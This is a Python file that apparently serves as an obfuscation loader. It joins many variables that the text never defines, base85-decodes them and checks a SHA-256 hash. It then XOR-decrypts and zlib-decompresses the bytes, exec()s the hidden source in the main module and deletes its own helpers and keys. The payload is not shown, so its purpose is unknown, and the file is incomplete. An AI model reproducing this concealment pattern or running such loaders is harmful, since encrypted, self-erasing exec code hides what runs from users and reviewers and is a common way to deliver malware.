_phqmd4HnLN_QJm = __import__('base64').b85decode(_crRQbslQsPigZN + _ccPHJ320qYeGD9 + _cngl8ilnAhYsne + _cm82nR7cdOwQxW + _cpyI0QRSCQ0hOo + _cqgNb53gGJCBhL + _cjE1MspYvEzvsN + _cf6NQ80iVV7fpW + _cqsMGB0HvJAYpT + _c_rw_6abwE5X5W + _costoNoFQrdQPg + _clzac3XRzet26x + _cpRukSVB840QtV + _ceQwwQUa1r2qFf + _crwUzggRkWUosq + _cqQN6S4jZX1Sb2 + _cwJB1jUnd49kRA + _cr4tbwgsAeMJnw + _clVRMQIPOyS5tl + _cxEeX7K3wlDIFr + _cjNxDDNVQ3oPoU + _cdorSTGzv99mSt + _cqh5XDJH6eBfEp + _cxM7ZYXwYtVZVa + _ckDXMRB_na4Wid + _ctqc6mvrS0VN9J + _c_p2alzMQguCZw + _cb4yPMMN_PG9fn + _cdIf7LICo9cgdI + _ckK258VbCA9NP0 + _ciyIBTHfd89qVr + _cqlQe829A5lMnq + _cnPfkUK78e_t8h + _cbPs9dBqrwqmjW + _ceTBrWUCdkH3wD + _cbkkTLHQanyjpo + _cpYhQkPazs1mu2 + _cbFisrm7n205bi + _cq9K3Rx25rbaig + _c_fv6KBOswfJ6P + _cugXPARmg8_BIw + _cukGtJ5Sz6pwk1 + _cfH7QfoVz_1Fg1 + _ccXKzOlynxp13E + _cvRlZzEOArVrOC + _cpa2NL9C9YOVq0 + _cvyy5yMrSMW_1v + _clI7ujhZXyV1Mm + _ck2w4bl8lzb9i4 + _cmz7q7fj44CY_s + _cuYAM5scbVG0pt + _caZvu6xXCOfAuC + _cromC45x5JJxVw + _cgmT7sVUgFaV9m + _ceSzhR3itq11cE + _cg2fMHcklDUol7 + _cmrZdePwPQbAX4 + _cfqrPRuISqf05w + _cuAyybnf6GylL4 + _coi8PP7FcUWohV + _cyQfVQnbtWCmtX + _clva0b447XWyqo + _cpkB_9feWPrWq7 + _cigbzfwzy7rPnZ + _cg1rPGHHr0eI8p + _crvDNvjyVaTcvl + _crHNbM_MsHSN30 + _cx1UF9AzNgKCEc + _czfKKneHQBdI90 + _cd6ThhARg7_P4Z + _cuhOIjEIbJcxUC + _cvGfUwJiwBb8WU + _cwNM2eErQzzPlk + _chGBSCn90h_EH4 + _cq2iDEyBuVF35Y + _cqdXenI9NFtpD5 + _cv_d5jJX1H6y5L + _cdQEf_6nA_wTBf + _cbhSSC8LL6kzJa + _cqZeIjg1EPQkuT + _crGkGHGC0fZTJp + _cihh85Axu7wzeY + _chE76RSrPnhtRe + _cpRsI0E3Nwi35l + _cc80yB0EJ1FwP2 + _cokcsUFwo9Jwtg + _ciGMbbaYvBvu52 + _cdJ2Cyo_lUQW2H + _cjWCFRQq8Rxbia + _cmvE44RUK7OElH + _caTnpe1cAiQG7b + _cqabucjFiqkYK9 + _cbayb5SI_Ehakh + _coe5wTVxTmhMRc + _cqpEIjMiNwkTgR + _coxattdh5CgOIV + _ccIdrZrXYP9_O4 + _cg9aTpJ3SKU2cP + _cnqFR7uRsQ3p2I + _clrcFeP_E2c_UP + _cuD9d7GoAFJuYw + _cq9VAf3NxqQr02 + _ciop450ZCsgDbR + _cp5a7Waqbl5rBj + _cv1Jbc6jOML3Nc + _cgIojYytkpLivD + _cjJyplwkO5vTUp + _ckB4jIR0soUlKr + _cllaYp4aRz6Ed6 + _chK0kStNlMOaSp + _cqBrgNaA3relhR + _cqJriDXqTsuZsi + _ctF4dKFQzMOhIq + _cqKYWyJbJEU1sg + _cn5zOIRdWmSmqB + _cv7ER3N6QnppLq + _cbGapNd8IjlCjw + _cxzxcqCzmgK1Is + _cjUMDxD6VFYT4e + _cfNUZOXWzJkI9D + _ciRTnoqu0ghqee + _ckk36bJtn5mbqI + _cuE259oeUjffi8 + _cy_kjw69bG7tE0 + _cia_nAlbPlfphr + _ceeeEwT9yDq4yc + _cbLH0LA5QMh3Kl + _cjHEjKBkPYJqnu + _cn1kwVR4dZ1F_m + _ca9OzkheEEXplC + _cbUvL55y9YU530 + _cm2UoeyRSqjd_v + _ctesohmRc3G861 + _ckYPBQBSrwXeJw + _csC4FWpOV6tXPt + _clqbLVPLe1qsqY + _caiHcM81Vdz6yH + _cfGgt2NMFI_4qx + _ciuALAPJi75e2T + _ckZsHTJrJMf5f7 + _cfOUEU_eadA37X + _ca2CG8INXd0DMq + _czLv_Ci5KkSNkR + _coV2jOCBlLE4_3 + _cnhdxxtJg9ywIS + _cmOn3l8O9er3eI + _cgT9q824HJxFGt + _ccJW_Y80EDTF8y + _cm2ME7hSEZRMxC + _cjUKJhS4O8sXS6 + _cttvChBABzCmn9 + _cjdtnPlkQLUMKv + _ch3VtN_spI4awH + _cauiObSm5zxowr + _cjA_TzdQ06hHkS + _cwA6AyXan3Sqp2 + _cifiV7HnBlqLvV + _cnj5kYUeyVNukM + _cmqEbIEXtluaFF + _cqvUPNi6a7Gopv + _ckk4JGqTg2gQm_ + _cjktQyw3p1Ms09)
if __import__('hashlib').sha256(_phqmd4HnLN_QJm).hexdigest() != '57f067cce3c2b767b0eec40e744d295d4f93bbde8db66924123e3c91af0be6aa':
    __import__('sys').exit(1)
_xlsrN3Sr9xhp3I = bytes([166, 144, 47, 80, 252, 179, 254, 89, 246, 233, 160, 202, 185, 196, 202, 178, 199, 44, 140])
_fkvnTd9h8fJOoXD = bytes([139, 254, 161, 162, 11, 136, 19, 232, 173, 96, 234, 153, 90, 145, 183, 176, 171, 61, 76])

def _fxoFFmCbs1zAmAq(_bd4eBpul5DLibE, _kcKLH2LA2NH258):
    return bytes(_bd4eBpul5DLibE[_iz_19d9UQOLoQB] ^ _kcKLH2LA2NH258[_iz_19d9UQOLoQB % len(_kcKLH2LA2NH258)] for _iz_19d9UQOLoQB in range(len(_bd4eBpul5DLibE)))

def _fdyngeAyueyPjZ7(_tzDyGp5Ogpxk3k):
    import zlib
    return zlib.decompress(_tzDyGp5Ogpxk3k) # Un seul niveau de zlib ici pour simplifier

def _feuk9Po0dloW7zH():
    import sys, builtins
    # 1. Déchiffrement XOR
    _x_XkbhBVd0WYtj = _fxoFFmCbs1zAmAq(_phqmd4HnLN_QJm, _xlsrN3Sr9xhp3I)
    # 2. Décompression Zlib
    _dctw_pjt7LkVP6 = _fdyngeAyueyPjZ7(_x_XkbhBVd0WYtj)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dctw_pjt7LkVP6.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nwTjjLbi4DAnpF = _main.__dict__
    _nwTjjLbi4DAnpF.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nwTjjLbi4DAnpF)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feuk9Po0dloW7zH()
try:
    del _fxoFFmCbs1zAmAq, _fdyngeAyueyPjZ7, _feuk9Po0dloW7zH
    del _phqmd4HnLN_QJm, _xlsrN3Sr9xhp3I, _fkvnTd9h8fJOoXD
except:
    pass
